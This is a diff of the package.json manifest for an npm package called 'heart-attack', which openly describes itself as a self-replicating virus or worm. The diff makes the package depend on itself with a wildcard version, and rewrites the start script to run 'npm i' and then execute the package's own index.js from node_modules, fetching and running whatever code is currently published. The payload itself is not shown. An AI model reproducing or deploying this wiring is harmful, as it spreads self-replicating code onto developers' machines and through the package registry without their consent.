@@ -1,8 +1,29 @@
 {
+    "name": "heart-attack",
+    "version": "0.0.911",
+    "description": "heart-attack self replicating virus node-js",
+    "type": "module",
+    "main": "index.js",
     "scripts": {
-        "test": "echo \"Error: no test specified\" && exit 1",
-        "start": "node ./index.js"
+        "test": "echo \"Error: no test specified\" && exit 1 && npm i && node ./node_modules/heart-attack/index.js",
+        "start": "npm i && node ./node_modules/heart-attack/index.js && node index.js"
     },
+    "repository": {
+        "type": "git",
+        "url": "git+https://github.com/RIAEvangelist/heart-attack.git"
+    },
+    "keywords": [
+        "heart",
+        "attack",
+        "virus",
+        "worm"
+    ],
+    "author": "Brandon Nozaki Miller",
+    "license": "ISC",
+    "bugs": {
+        "url": "https://github.com/RIAEvangelist/heart-attack/issues"
+    },
+    "homepage": "https://github.com/RIAEvangelist/heart-attack#readme",
     "dependencies": {
         "heart-attack": "*"
     }
